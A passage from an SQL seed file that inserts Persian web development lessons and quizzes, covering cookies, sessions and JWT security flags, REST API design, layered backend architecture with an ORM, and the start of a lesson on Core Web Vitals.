نوشتن‌ها — یا بهتر، نوشتن را با requestAnimationFrame به قبل از رندر بعدی منتقل کن."},{"k":"tip","title":"نکته حرفه‌ای","t":"در دیوتولز، تب Performance را ضبط کن و با کلیک روی یک میله زرد (JS)، شعله‌نگار (Flame Chart) را ببین: توابع طولانی (Long Task بالای ۵۰ms) همان‌هایی‌اند که INP را خراب می‌کنند. نام تابع و زمانش دقیقاً می‌گوید گلوگاه کجاست — و اکثر اوقات، یک تابع است نه «کل اپلیکیشن»."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["DOM درخت زنده است؛ تغییرش گران است — دسته کن و برای متن کاربر textContent بزن.","رویدادها حباب می‌شوند؛ Delegation یعنی یک شنونده روی والد برای هزار فرزند، فعلی و آینده.","یک نخ + دو صف (Microtask و Macrotask): کار سنگین را بشکن تا رندر و تعامل قفل نشوند."]}]'::jsonb, '[{"q":"مزیت Event Delegation نسبت به شنونده برای هر عنصر چیست؟","opts":["سریع‌تر کلیک می‌شود","یک شنونده، حافظه کمتر و پوشش خودکار عناصری که بعداً اضافه می‌شوند — چون شنونده روی والد ثابت است","کد کوتاه‌تر نمی‌شود","فقط در React کار می‌کند"],"ans":1,"why":"لیست‌های دینامیک مشکل اصلی‌اند: با شنونده مستقیم، هر عنصر جدید کد اضافه می‌خواهد؛ با Delegation، حباب رویداد کار را به والد می‌رساند که از اول آماده است."},{"q":"چرا یک حلقه for سنگین، کلیک‌ها را قفل می‌کند؟","opts":["باگ مرورگر است","JS تک‌نخ است؛ تا Task فعلی تمام نشود، صف رویدادها (از جمله کلیک و رندر) نوبت نمی‌گیرد","فقط در موبایل","Promiseها مقصرند"],"ans":1,"why":"رویدادها در صف منتظرند و حلقه یک Task بلند است — پس رابط کاربری فریز می‌شود. درمان: شکستن کار به Taskهای کوچک (chunking) یا انتقال به Worker."},{"q":"چرا بعد از تغییرات DOM، خواندن offsetWidth گران است؟","opts":["کش پاک می‌شود","مرورگر مجبور می‌شود Layout را فوراً و همگام دوباره حساب کند — و تکرارش در حلقه یعنی Layout پشت‌سرهم (Thrashing)","JS کند است","فقط در Grid"],"ans":1,"why":"مرورگر Layout را تنبل و دسته‌ای انجام می‌دهد؛ ولی خواندنِ هندسه بعد از نوشتن، او را مجبور به محاسبه فوری می‌کند. اول همه خواندن‌ها، بعد همه نوشتن‌ها."}]'::jsonb),
('web-r6', 'web', 'هویت و حالت در وب؛ Cookie، Session و JWT', 60, 6, '[{"k":"p","t":"HTTP ذاتاً فراموشکار است — هر درخواست برایش غریبه‌ای جدید است. با این حال همه‌ی ما ساعت‌ها لاگین می‌مانیم و سبد خریدمان حفظ می‌شود. این «حافظه مصنوعی» که روی پروتکل بی‌حالت سوار شده، یکی از ظریف‌ترین و امنیتی‌ترین بخش‌های توسعه وب است — و جایی که تازه‌کارها خطرناک‌ترین اشتباه‌ها را می‌کنند."},{"k":"h","t":"کوکی؛ تنها مکانی که مرورگر خودش همکاری می‌کند"},{"k":"p","t":"کوکی تکه‌ی کوچکی از داده است که سرور با Set-Cookie می‌فرستد و مرورگر با هر درخواستِ همان دامنه، خودکار برمی‌گرداند — بدون هیچ کد جاوااسکریپتی. سه پرچم امنیتی‌اش حیاتی‌اند: HttpOnly یعنی جاوااسکریپت نمی‌تواند بخواندش (پس XSS نمی‌تواند بدزددش)، Secure یعنی فقط با HTTPS می‌رود و SameSite=Lax یعنی در درخواست‌های بین‌سایتی ارسال نمی‌شود (پس CSRF تقریباً خنثی می‌شود). این «ارسال خودکار» دقیقاً همان چیزی است که کوکی را برای Session ایده‌آل و هم‌زمان هدف حملات می‌کند — پس پرچم‌ها را نه به‌عنوان گزینه، که به‌عنوان الزام ببین."},{"k":"h","t":"Session در برابر JWT؛ حالت در سرور یا در کلاینت"},{"k":"p","t":"در مدل Session، سرور واقعاً «به یاد می‌آورد»: یک شناسه تصادفی غیرقابل‌حدس در کوکی و یک ردیف در حافظه سرور. خروج یعنی حذف ردیف — ابطال فوری و قطعی. در مدل JWT، سرور فراموشکار می‌ماند و «حافظه» را به کلاینت می‌سپارد: توکنی امضاشده که ادعاها (id، نقش، انقضا) را همراه دارد و سرور فقط امضا را راستی‌آزمایی می‌کند. مزیت JWT برای معماری‌های چندسرویسی و Stateless روشن است — ولی بهایش این است که تا انقضا قابل‌ابطال نیست؛ «خروج از همه دستگاه‌ها» یعنی لیست سیاه و پیچیدگی. پس انتخاب بین «ابطال آسان + وابستگی به سرور» و «مقیاس‌پذیری + ابطال سخت» است — نه بین درست و غلط."},{"k":"h","t":"کجا ذخیره کنیم؟ سوالی که از خودش مهم‌تر است"},{"k":"p","t":"اگر Access Token را در localStorage بگذاری، هر اسکریپت صفحه — از جمله کد مخربِ یک وابستگی آلوده — آن را می‌خواند و تا ابد نگه می‌دارد. الگوی مدرنِ سخت‌گیرانه: Access Token کوتاه‌عمر (۱۵ دقیقه) در حافظه JS و Refresh Token در کوکی HttpOnly با چرخش — دزدیده‌شدنِ سخت‌تر و پنجره سوءاستفاده کوتاه. و فراموش نکن: هیچ الگویی جای CSRF را با SameSite و Origin-check نمی‌گیرد و هیچ چیز، لاگ‌نکردنِ رازها و کوتاه‌نگه‌داشتن عمر توکن را."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"js","title":"ورود امن — الگوی Refresh در کوکی","code":"// سرور (Express)\napp.post(''/login'', async (req, res) => {\n  const user = await verify(req.body);      // رمز + Argon2\n  if (!user) return res.status(401).json({ ok: false });\n\n  const access  = sign({ sub: user.id, role: user.role },\n                       ACCESS_KEY, { expiresIn: ''15m'' });\n  const refresh = randomBytes(32).toString(''hex'');\n\n  await db.refresh.save({                   // سمت سرور ثبت می‌شود\n    hash: sha256(refresh), userId: user.id, expires: addDays(30),\n  });\n\n  res.cookie(''refresh'', refresh, {\n    httpOnly: true,     // JS نمی‌بیند ← در برابر دزدی XSS\n    secure: true,       // فقط HTTPS\n    sameSite: ''lax'',    // در برابر CSRF\n    path: ''/auth/refresh'',                  // حداقل سطح دسترسی!\n    maxAge: 30 * 864e5,\n  });\n  res.json({ access });   // Access در بدنه — در حافظه JS می‌ماند\n});\n\n// کلاینت: Access منقضی شد؟ بدون دخالت کاربر نوسازی کن\nasync function api(path, opts) {\n  let res = await fetch(path, withAuth(opts));\n  if (res.status === 401) {\n    const { access } = await fetch(''/auth/refresh'',\n      { method: ''POST'', credentials: ''include'' }).then(r => r.json());\n    setAccess(access);\n    res = await fetch(path, withAuth(opts));\n  }\n  return res;\n}"},{"k":"list","items":["path: ''/auth/refresh'' یعنی کوکی رفرش فقط با همان یک مسیر می‌رود — حتی اگر بقیه اپلیکیشن XSS داشته باشد، کوکی در آن درخواست‌ها ارسال نمی‌شود.","Refresh به‌صورت hash ذخیره می‌شود، نه خام — اگر دیتابیس لو رفت، توکن‌ها مستقیم قابل‌استفاده نیستند (مثل رمز عبور).","Access Token در JSON است نه کوکی — پس جاوااسکریپت آن را نگه می‌دارد (حافظه یا متغیر) و با رفرش صفحه، با یک /refresh بی‌صدا برمی‌گردد.","چرخش Refresh (هر بار که استفاده شد، قبلی باطل و جدید صادر شود) یعنی استفاده مجدد از توکن قدیمی = اعلام سرقت."]},{"k":"def","term":"SameSite","t":"ویژگی کوکی که تعیین می‌کند آیا در درخواست‌های «آغازشده از سایت دیگر» ارسال شود یا نه. Strict هرگز نمی‌فرستد، Lax فقط در ناوبری سطح‌بالا (کلیک روی لینک) می‌فرستد و None یعنی همیشه (که Secure هم لازم دارد). با Lax، حمله کلاسیک CSRF — «کاربرِ لاگین‌شده بدون اطلاعش درخواستی برایش بفرست» — در اکثر مسیرها از اساس شکست می‌خورد."},{"k":"table","head":["مخزن","دسترسی JS","ارسال خودکار","مناسب برای"],"rows":[["کوکی HttpOnly","ندارد","دارد (با هر درخواست)","Refresh Token و Session ID"],["localStorage","دارد — هر اسکریپتی","ندارد","تنظیمات غیرحساس؛ نه توکن"],["sessionStorage","دارد","ندارد","داده موقتِ یک تب"],["حافظه JS (متغیر)","دارد ولی با رفرش می‌پرد","ندارد","Access Token کوتاه‌عمر"]]},{"k":"warn","title":"دام رایج","t":"JWT با انقضای طولانی (روزها) در localStorage و بدون راه ابطال — ترکیبی که یک XSS ساده را به سرقت حساب دائمی تبدیل می‌کند. توکن بلندعمر یعنی بلیت بلندعمر؛ عمرش را کوتاه کن و راه نوسازی امن بساز، نه اینکه امیدوار باشی لو نمی‌رود."},{"k":"tip","title":"نکته حرفه‌ای","t":"بعد از هر بار تغییر در منطق احراز هویت، این چهار سناریو را دستی تست کن: رفرش صفحه، بازکردن در تب دوم، انقضای Access وسط کار، و کلیک روی لینک از یک سایت دیگر. تقریباً همه باگ‌های auth در همین چهار مسیر زندگی می‌کنند — و همه‌شان با چشم و دیوتولز پیدا می‌شوند."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["کوکی سه پرچم الزامی دارد: HttpOnly، Secure و SameSite — بدون آن‌ها، قابلیت‌هایش تهدیدند.","Session = ابطال آسان و وابستگی به سرور؛ JWT = بی‌نیازی از حالت سرور و ابطال سخت. انتخاب معماری است، نه مد.","الگوی سخت‌گیرانه: Access کوتاه‌عمر در حافظه JS + Refresh چرخشی در کوکی HttpOnly با path محدود."]}]'::jsonb, '[{"q":"چرا HttpOnly جلوی دزدی توکن با XSS را می‌گیرد؟","opts":["رمزنگاری می‌کند","جاوااسکریپتِ صفحه — از جمله کد تزریق‌شده — اصلاً نمی‌تواند کوکی را بخواند؛ فقط مرورگر و در مسیرهای مجاز ارسالش می‌کند","کوکی را مخفی می‌کند","فقط در HTTPS کار می‌کند"],"ans":1,"why":"XSS برای دزدیدن توکن از localStorage باید فقط document.cookie یا getItem را بخواند؛ HttpOnly هر دو مسیر JS را می‌بندد و حمله را بی‌ثمر می‌کند."},{"q":"تفاوت عملی Session و JWT در «خروج از همه دستگاه‌ها» چیست؟","opts":["فرقی ندارند","در Session کافی است ردیف‌های سرور حذف شوند؛ JWT تا انقضا معتبر است و ابطالش نیاز به لیست سیاه یا انقضای خیلی کوتاه دارد","JWT بهتر است","Session قدیمی شده"],"ans":1,"why":"JWT «بی‌حالت» است — یعنی سرور چیزی برای حذف ندارد. این آزادی، بهای ابطال سخت را دارد؛ برای محصول‌های حساس، Session یا ترکیب Refresh در سرور منطقی‌تر است."},{"q":"SameSite=Lax جلوی چه حمله‌ای را می‌گیرد؟","opts":["XSS","CSRF — درخواست جعلی که از سایت دیگر به‌نام کاربر لاگین‌شده فرستاده می‌شود، چون کوکی همراهش نمی‌رود","SQLi","شنود شبکه"],"ans":1,"why":"CSRF به «ارسال خودکار کوکی» متکی است؛ Lax این ارسال را در درخواست‌های بین‌سایتی (مثل فرم مخفی یا img) متوقف می‌کند — لایه دفاعی رایگان مرورگر."}]'::jsonb)
INSERT INTO lessons (id, course_id, title, minutes, sort_order, blocks, quiz) VALUES
('web-r7', 'web', 'طراحی REST API؛ قراردادی که فرانت و بک را به هم می‌دوزد', 60, 7, '[{"k":"p","t":"API مرز دو دنیاست: هر ابهامی که امروز در طراحی‌اش بگذاری، فردا به شکل باگ، سوال تکراری و کد کثیف در هر دو طرف برمی‌گردد. REST خوب یعنی فرانت‌اندکار بتواند با دیدن یک endpoint، رفتارش را حدس بزند — و این «قابل‌حدس‌بودن»، مهندسی است، نه سلیقه."},{"k":"h","t":"منابع و فعل‌ها؛ اسم‌ها، نه کارها"},{"k":"p","t":"REST حول «منابع» می‌گردد — چیزهایی که سیستم درباره‌شان حرف می‌زند — و URL نشانی منابع است، نه آدرس عملیات: /books/42 نه /getBookById?id=42. عمل را متد HTTP می‌گوید: GET بخوان، POST بساز، PUT جایگزین کن، PATCH تغییر بده، DELETE حذف کن. دو خاصیت ریاضی که طراحی را قدرتمند می‌کنند: GET باید ایمن (بدون اثر جانبی) و PUT و DELETE باید Idempotent باشند — یعنی تکرارشان همان اثر یک بار را داشته باشد؛ به همین دلیل مرورگرها، کش‌ها و retryها می‌توانند با خیال راحت با این متدها کار کنند."},{"k":"h","t":"کدهای وضعیت؛ زبان مشترک موفقیت و شکست"},{"k":"p","t":"هر پاسخ باید با کدی جواب بدهد که خودش خبر را می‌دهد: 200 موفقیت خواندن، 201 ساختن (با Location به منبع جدید)، 204 موفقیتِ بدون بدنه، 400 درخواست بد (با جزئیات خطا)، 401 «نمی‌دانم کیستی»، 403 «می‌دانم ولی اجازه نداری»، 404 «نیست»، 409 تضاد (مثل ایمیل تکراری) و 500 «مشکل از ماست». دو اشتباه رایج: 200 فرستادن برای خطا (فرانت مجبور می‌شود بدنه را بخواند تا بفهمد چه شده) و استفاده از 500 برای خطای کاربر (که مانیتورینگ را به دروغ به صدا درمی‌آورد). بدنه خطا هم باید ساختار ثابت داشته باشد — کد ماشین‌خوان، پیام انسان‌خوان و اشاره به فیلد مشکل‌دار — نه رشته آزاد."},{"k":"h","t":"مقیاس‌پذیری قرارداد؛ صفحه‌بندی، نسخه‌بندی و تکامل"},{"k":"p","t":"هیچ لیستی را بدون صفحه‌بندی برنگردان — cursor-based برای داده‌های زنده و keyset‌دار پایدارتر از offset است (چون insertion وسط، صفحه‌ها را جابه‌جا نمی‌کند). برای تکامل API بدون شکستن کلاینت‌ها، دو راه مرسوم: مسیر (/v1/books) که ساده و صریح است، یا سربرگ محتوا که تمیزتر ولی پنهان‌تر. و قانون طلایی تکامل: فقط «اضافه» کن — فیلد جدید با مقدار پیش‌فرض، نه حذف یا تغییرمعنای فیلد قدیمی؛ چیزی که حذف لازم دارد، یعنی یک نسخه جدید. در نهایت: مستند زنده (OpenAPI) از روز اول — نه چون شیک است، چون تنها راهی است که قرارداد واقعاً مشترک می‌ماند."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"txt","title":"یک API کوچک که همه قواعدش درست است","code":"GET    /v1/books?cursor=eyJpZCI6NDJ9&limit=20\n       → 200  { \"items\": [...], \"next\": \"eyJpZCI6NjJ9\" }\n\nGET    /v1/books/42\n       → 200  { \"id\": 42, \"title\": \"...\", \"author\": {...} }\n       → 404  { \"error\": \"BOOK_NOT_FOUND\", \"message\": \"...\" }\n\nPOST   /v1/books\n       → 201  Location: /v1/books/43\n       → 422  { \"error\": \"VALIDATION_FAILED\",\n               \"fields\": { \"isbn\": \"فرمت ISBN نامعتبر است\" } }\n\nPATCH  /v1/books/42   { \"title\": \"نسخه دوم\" }\n       → 200  (فقط فیلد فرستاده‌شده تغییر می‌کند)\n\nPUT    /v1/books/42   { ... کل منبع ... }\n       → 200  (جایگزینی کامل — تکرارش بی‌اثر)\n\nDELETE /v1/books/42\n       → 204  (موفق، بدون بدنه — تکرارش هم بی‌اثر)"},{"k":"list","items":["cursor به‌جای page/offset: کلاینت فقط next را برمی‌گرداند — پایدار در برابر insertion همزمان و بدون شمارش کل جدول.","201 با سربرگ Location یعنی «ساخته شد و این‌جاست» — فرانت می‌تواند مستقیم به منبع جدید برود بدون حدس‌زدن id.","422 برای خطای اعتبارسنجی (در برابر 400 کلی) با آرایه fields — فرانت می‌تواند خطا را دقیقاً زیر همان input نشان بدهد.","DELETE با 204 بدون بدنه: چیزی برای گفتن نیست؛ و Idempotent یعنی DELETE دوم هم همان 204 (یا 404) است، نه خطای 500."]},{"k":"def","term":"Idempotency","t":"خاصیت عملی که اجرای چندباره‌اش همان اثر اجرای یک‌بار را دارد: PUT و DELETE چنین‌اند ولی POST نیست (هر بار یک منبع جدید می‌سازد). اهمیتش در دنیای واقعی این است که شبکه نامطمئن است و retry اجتناب‌ناپذیر — اگر کلاینت نداند درخواست قبلی‌اش رسید یا نه و عمل Idempotent نباشد، یا باید ریسک تکرار را بپذیرد یا همیشه منتظر بماند. برای POSTهای حساس (پرداخت)، کلید Idempotency همین خاصیت را دستی می‌سازد."},{"k":"table","head":["کد","معنی","کی برمی‌گردد"],"rows":[["201 Created","ساخته شد","همراه Location به منبع جدید"],["204 No Content","موفق، بدنه‌ای نیست","DELETE و PATCHهای خالی"],["401 / 403","هویت نامعلوم / اجازه نیست","توکن ندارد / توکن دارد ولی نقش نه"],["409 Conflict","تضاد با وضعیت فعلی","ایمیل تکراری، نسخه قدیمی"],["422 Unprocessable","ساختار درست، معنا نه","خطای اعتبارسنجی فیلدها"]]},{"k":"warn","title":"دام رایج","t":"طراحی RPC-گونه با فعل در URL — مثل /deleteUser یا /approveOrder — که همه مزایای REST (کش GET، Idempotency متد، ابزارهای خودکار) را دور می‌ریزد و هر endpoint را جزیره‌ای بی‌قاعده می‌کند. اگر داری «کار» را در URL می‌نویسی، مکث کن و بپرس «منبعش چیست؟» — معمولاً یک Order با PATCH وضعیت دارد، نه یک approveOrder."},{"k":"tip","title":"نکته حرفه‌ای","t":"قرارداد خطا را قبل از اولین endpoint بنویس و در همه API یکی نگه دار: { error: \"CODE\", message, fields? }. فرانت می‌تواند یک handler مرکزی بنویسد و برای هر کد، رفتار درست (ورود مجدد، نمایش فرم، toast) را انتخاب کند. APIهای بزرگ را نه پاسخ‌های موفق، که یکدستیِ پاسخ‌های خطایشان قابل‌استفاده نگه می‌دارد."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["URL اسم منابع است و متد، فعل — GET ایمن و PUT/DELETE هم‌توان (Idempotent) تا کش و retry امن شوند.","کد وضعیت خودش خبر است؛ بدنه خطا ساختار ثابت با کد ماشین‌خوان و اشاره به فیلد دارد.","تکامل = فقط اضافه‌کردن؛ صفحه‌بندی cursor-based؛ و OpenAPI از روز اول."]}]'::jsonb, '[{"q":"چرا GET باید «ایمن» و بدون اثر جانبی باشد؟","opts":["سریع‌تر است","چون مرورگرها، کش‌ها و موتورهای جست‌وجو آزادانه GET را تکرار و ذخیره می‌کنند — اگر GET چیزی را تغییر بدهد، یک prefetch ساده می‌تواند داده خراب کند","قانون HTTP است","فرقی نمی‌کند"],"ans":1,"why":"GET /orders/42/delete اگر حذف کند، کافی است مرورگر برای پیش‌نمایش لینک آن را واکشی کند — و داده رفته است. ایمنی GET یعنی واکشیِ بی‌ترس."},{"q":"تفاوت 401 و 403 در عمل چیست؟","opts":["فرقی ندارند","401 یعنی «نمی‌دانم کی هستی» (توکن ندارد یا باطل است → بفرست دوباره وارد شو)؛ 403 یعنی «هویتت معلوم است ولی اجازه نداری» (ورود مجدد کمکی نمی‌کند)","403 شدیدتر است","بستگی به فریم‌ورک دارد"],"ans":1,"why":"رفتار کلاینت فرق می‌کند: 401 → نوسازی توکن یا صفحه ورود؛ 403 → پیام «دسترسی نداری» و شاید درخواست ارتقای نقش. قاطی‌کردنشان یعنی UX گیج‌کننده."},{"q":"چرا صفحه‌بندی cursor-based از offset-based پایدارتر است؟","opts":["سریع‌تر نیست","چون بر اساس «آخرین چیزی که دیدی» ادامه می‌دهد، نه شماره — پس insertion یا حذف همزمان، آیتم‌ها را تکراری یا گم‌شده نمی‌کند","ساده‌تر است","فقط برای دیتابیس‌های خاص"],"ans":1,"why":"با offset=20، اگر دو رکورد جدید اول جدول بیاید، صفحه بعد همان دو را دوباره نشان می‌دهد یا یکی را جا می‌اندازد. cursor می‌گوید «بعد از id=42» — و این تحت هر تغییری معنی‌دار می‌ماند."}]'::jsonb),
('web-r8', 'web', 'معماری بک‌اند؛ لایه‌ها، ORM و جریان یک درخواست', 65, 8, '[{"k":"p","t":"بک‌اندِ روز اول با ده endpoint تمیز است؛ بک‌اندِ روز صدم بدون معماری، گره‌ای است که هیچ‌کس جرئت بازش‌کردن ندارد. معماری لایه‌ای جادو نیست — فقط یک نظم: هر کس یک کار، و درخواست مسیری مشخص از درِ ورودی تا دیتابیس و برگشت. این نظم است که بعداً اجازه می‌دهد تست بنویسی، دیباگ کنی و نترسی."},{"k":"h","t":"سه لایه؛ هر کس یک زبان"},{"k":"p","t":"مسیر استاندارد یک درخواست: Controller (یا Route Handler) فقط ترجمه‌گر است — HTTP می‌گیرد، اعتبارسنجی می‌کند، به Service می‌سپارد و نتیجه را به پاسخ HTTP برمی‌گرداند. Service قلب منطق کسب‌وکار است — قوانینی که اگر دیتابیس عوض شود هم باید بمانند: «سفارش بالای ۵ میلیون، ارسال رایگان دارد». و Repository تنها کسی است که با دیتابیس حرف می‌زند — بقیه اپلیکیشن حتی نمی‌داند SQL است یا NoSQL. معیار ساده تستِ درست بودن لایه‌ها: اگر نتوانستی منطق کسب‌وکار را بدون Express تست کنی، یعنی منطق در Controller نشسته — جای اشتباه."},{"k":"h","t":"ORM؛ اهرم قدرت و تله‌هایش"},{"k":"p","t":"ORM (مثل Prisma یا TypeORM) دیتابیس را به اشیای زبان می‌آورد: query می‌شود متد، join می‌شود رابطه، و مهاجرت اسکیما می‌شود فایل نسخه‌دار. بردهای واقعی: امنیت ذاتی (queryهای پارامتری)، مهاجرت‌های قابل‌بازگشت و سوییچ آسان‌تر ذهن بین مدل و داده. ولی دو تله بزرگ دارد: اول N+1 — حلقه‌ای که برای هر والد، یک query جدا برای فرزندانش می‌زند و یک صفحه لیست را به صد query تبدیل می‌کند (درمانش eager loading و include است)؛ و دوم نشت انتزاع — جایی که ORM کند است و باید SQL خام نوشت، که اگر لایه Repository داشته باشی، فقط یک فایل عوض می‌شود."},{"k":"h","t":"تزریق وابستگی؛ وارونگی که آزاد می‌کند"},{"k":"p","t":"وقتی Service مستقیم new PostgreSQLRepository() بسازد، برای تستش به دیتابیس واقعی نیاز داری — و تست کند و شکننده می‌شود. تزریق وابستگی (DI) این جهت را وارونه می‌کند: Service اعلام می‌کند «من یک OrderRepository می‌خواهم» و کسی از بیرون (Composition Root) تصمیم می‌گیرد چه چیزی به او بدهد — در تولید، نسخه واقعی؛ در تست، نسخه درون‌حافظه‌ای با داده ساختگی. نتیجه: تست‌های واحد واقعی (سریع، ایزوله، قابل‌تکرار) و تعویض‌پذیری اجزا بدون جراحی. در جاوااسکریپت لازم نیست فریم‌ورک DI سنگین بیاوری — پاس‌دادن وابستگی‌ها در سازنده، همان ایده است."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"ts","title":"یک درخواست در سه لایه — و درمان N+1","code":"// ─── Repository: تنها دروازه دیتابیس ───\ninterface OrderRepo {\n  findWithItems(userId: string): Promise<Order[]>;\n}\nclass PgOrderRepo implements OrderRepo {\n  async findWithItems(userId: string) {\n    return db.order.findMany({\n      where: { userId },\n      include: { items: true },   // ← یک query با JOIN\n      // بدون include: N+1!\n      // (هر سفارش، یک query جدا برای آیتم‌هایش)\n    });\n  }\n}\n\n// ─── Service: منطق کسب‌وکار، بی‌خبر از HTTP ───\nclass OrderService {\n  constructor(private repo: OrderRepo) {}   // تزریق وابستگی\n\n  async summaryFor(userId: string) {\n    const orders = await this.repo.findWithItems(userId);\n    return orders.map(o => ({\n      id: o.id,\n      total: o.items.reduce((s, i) => s + i.price * i.qty, 0),\n      freeShipping: this.totalOf(o) > 5_000_000,  // قانون کسب‌وکار\n    }));\n  }\n}\n\n// ─── Controller: فقط ترجمه HTTP ───\nrouter.get(''/me/orders'', async (req, res) => {\n  const dto = await orderService.summaryFor(req.user.id);\n  res.json(dto);\n});"},{"k":"list","items":["include: { items: true } یعنی Prisma یک JOIN می‌زند — بدونش، ۲۰ سفارش یعنی ۲۱ query؛ با آن، ۲ query. N+1 همین یک خط فرق است.","Service نه req را می‌شناسد نه res را — پس می‌توانی با new OrderService(fakeRepo) تستش کنی بدون سرور و دیتابیس.","قانون «ارسال رایگان» در Service است؛ فردا که بخواهد از یک API خارجی بیاید، Controller و Repository دست‌نخورده می‌مانند.","interface OrderRepo مرز قرارداد است — نسخه تست، همان متد را با آرایه درون‌حافظه‌ای جواب می‌دهد."]},{"k":"def","term":"مسئله N+1","t":"الگوی کندی که در آن یک query لیست (۱) با N query جزئیات (یکی برای هر عضو) همراه می‌شود — مثلاً ۵۰ کتاب و برای هرکدام یک query نویسنده: ۵۱ سفر به دیتابیس برای یک صفحه. دلیلش این است که ORM دسترسی تنبل دارد و توسعه‌دهنده داخل حلقه به رابطه دسترسی می‌کند. درمان: بارگذاری مشتاقانه (eager/JOIN) یا DataLoader که درخواست‌های هم‌زمان را دسته می‌کند. ساده‌ترین تشخیص: شمارنده query را در توسعه روشن کن — اگر یک صفحه بیش از ده‌ها query می‌زند، N+1 somewhere هست."},{"k":"table","head":["لایه","مسئولیت","نباید بداند"],"rows":[["Controller","پارس ورودی، اعتبارسنجی، کد وضعیت","قواعد کسب‌وکار و SQL"],["Service","قواعد کسب‌وکار و تراکنش‌ها","HTTP، فرمت JSON، headerها"],["Repository","دسترسی و نگاشت داده","چرا داده لازم است"],["DTO/Entity","شکل بیرونی در برابر شکل داخلی","همدیگر!"]]},{"k":"warn","title":"دام رایج","t":"«لایه‌بندی نمایشی»: سه فایل ساختن ولی منطق واقعی در Controller — Serviceهایی که فقط صدا می‌زنند و Repositoryهایی که فقط پاس می‌دهند. لایه ارزشش به مکث‌کردن فکر در مرزهاست؛ اگر یک لایه هیچ تصمیمی نمی‌گیرد، حذفش کن — لایه اضافی هم هزینه است، مثل لایه ناقص."},{"k":"tip","title":"نکته حرفه‌ای","t":"برای هر endpoint جدید، اول Service را بنویس و با یک Repository جعلی تستش کن — قبل از اینکه حتی route تعریف شده باشد. این ترتیبِ «بیرون به درون» (Outside-In TDD) دو هدیه دارد: منطق از روز اول قابل‌تست است و شکل DTO را نیاز واقعیِ فرانت تعیین می‌کند، نه راحتیِ دیتابیس."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["Controller ترجمه HTTP، Service منطق کسب‌وکار، Repository تنها دروازه دیتابیس — و معیارت: Service بدون HTTP قابل‌تست باشد.","ORM امنیت و سرعت توسعه می‌دهد ولی N+1 و نشت انتزاع دارد — eager loading و لایه Repository درمان‌هایند.","تزریق وابستگی یعنی اعلام نیاز، نه ساختن — تا در تست، وابستگی واقعی با نسخه ساختگی عوض شود."]}]'::jsonb, '[{"q":"N+1 یعنی چه و چرا خطرناک است؟","opts":["خطای ORM","یک query لیست + N query جزئیات در حلقه — تعداد سفرها به دیتابیس خطی با اندازه لیست رشد می‌کند و صفحه را کند می‌کند","نسخه ORM","نوع ایندکس"],"ans":1,"why":"۱۰۰ سفارش یعنی ۱۰۱ round-trip به دیتابیس — و در شبکه، تعداد سفرها اغلب مهم‌تر از حجم داده است. با JOIN همین صفحه می‌شود ۲ سفر."},{"q":"معیار ساده اینکه منطق کسب‌وکار جای درست نشسته چیست؟","opts":["تعداد فایل‌ها","بتوانی Service را بدون Express و دیتابیس واقعی تست کرد — چون نه HTTP را می‌شناسد نه پیاده‌سازی ذخیره را","کامنت‌های خوب","نام‌گذاری تمیز"],"ans":1,"why":"اگر برای تست «ارسال رایگان» باید سرور بالا بیاوری، یعنی قانون در Controller یا در دل query گیر کرده — جایی که تغییرش گران و تستش کند است."},{"q":"تزریق وابستگی چه چیزی را ممکن می‌کند؟","opts":["سرعت بیشتر در تولید","تعویض پیاده‌سازی واقعی با نسخه آزمایشی بدون تغییر کد Service — چون وابستگی از بیرون می‌آید، نه ساخته داخلش","SQL بهتر","امنیت خودکار"],"ans":1,"why":"وقتی OrderRepository یک interface است که از سازنده می‌آید، تست می‌تواند نسخه درون‌حافظه‌ای بدهد — و همان کدی که در تولید اجرا می‌شود، ایزوله و سریع تست می‌شود."}]'::jsonb),
('web-r9', 'web', 'عملکرد وب؛ Core Web Vitals و بودجه‌بندی سرعت', 60, 9, '[{"k":"p","t":"کاربر نمی‌گوید «LCP من ۴ ثانیه است» — می‌گوید «سایتت کند است» و می‌رود. گوگل این حس را به سه عدد ترجمه کرده که مستقیماً روی تجربه و رتبه جست‌وجو اثر دارند. خبر خوب: بیشتر سایت‌ها نه به معماری پیچیده، که به حذف ده چیز کوچکِ اضافه نیاز دارند — و این درس، فهرست آن ده چیز است."},{"k":"h","t":"سه معیاری که واقعاً سنجیده می‌شوند"},{"k":"p","t":"LCP زمان رسیدن بزرگ‌ترین محتوای قابل‌دیدن است — هدف زیر ۲٫۵ ثانیه؛ قاتلش تصویر Hero سنگین و فونت دیررس است. INP بدترین تأخیر پاسخ به تعامل کاربر — هدف زیر ۲۰۰ میلی‌ثانیه؛ قاتلش جاوااسکریپت طولانیِ نخ اصلی است که بین کلیک و واکنش می‌نشیند. CLS جمع جابه‌جایی‌های ناخواسته چیدمان — هدف زیر ۰٫۱؛ قاتلش تصویر بدون ابعاد، فونت swap بدون رزرو و بنرهای دیررس. سه عدد، سه جنس مشکل: بایت، CPU و نظم — و هر کدام درمان‌های متفاوتی دارند که قاطی‌کردنشان، بهینه‌سازی را بی‌اثر می‌کند."},{"k":"h","t":"تصاویر و فونت‌ها؛ نیمی از جنگ"},{"k":"p","t":"تصویر معمولاً نصف بایت صفحه است و چهار اهرم دارد: فرمت مدرن (AVIF/WebP به‌جای JPEG — تا ۵۰٪ کوچک‌تر)، ابعاد واقعی (فرستادن ۲۰۰۰px برای نمایش ۴۰۰px هدرافت محض است — srcset و sizes حلش می‌کنند)، فشرده‌سازی باکیفیت و lazy برای زیرِ خط. فونت هم همین‌طور: فرمت WOFF2، زیرمجموعه‌سازی (فقط حروف فارسی+لاتین لازم، نه کل فایل یونیکد)، font-display: swap برای جلوگیری از متن نامرئی و preload برای فونتِ متن اصلی. فونت فارسی خوب حدود ۱۰۰ تا ۳۰۰ کیلوبایت است — اگر فونتت مگابایت است، چیزی اشتباه است."},{"k":"h","t":"جاوااسکریپت؛ گران‌ترین بایت"},{"k":"p","t":"یک کیلوبایت JS گران‌تر از یک کیلوبایت تصویر است: باید دانلود، پارس، کامپایل و اجرا شود — همه روی همان نخی که کلیک‌ها را هم جواب می‌دهد. سه راه اصلی کم‌کردن بار: Code Splitting یعنی کاربر هر صفحه فقط کد همان صفحه را بگیرد (import() پویا)، Tree Shaking یعنی کدهای استفاده‌نشده 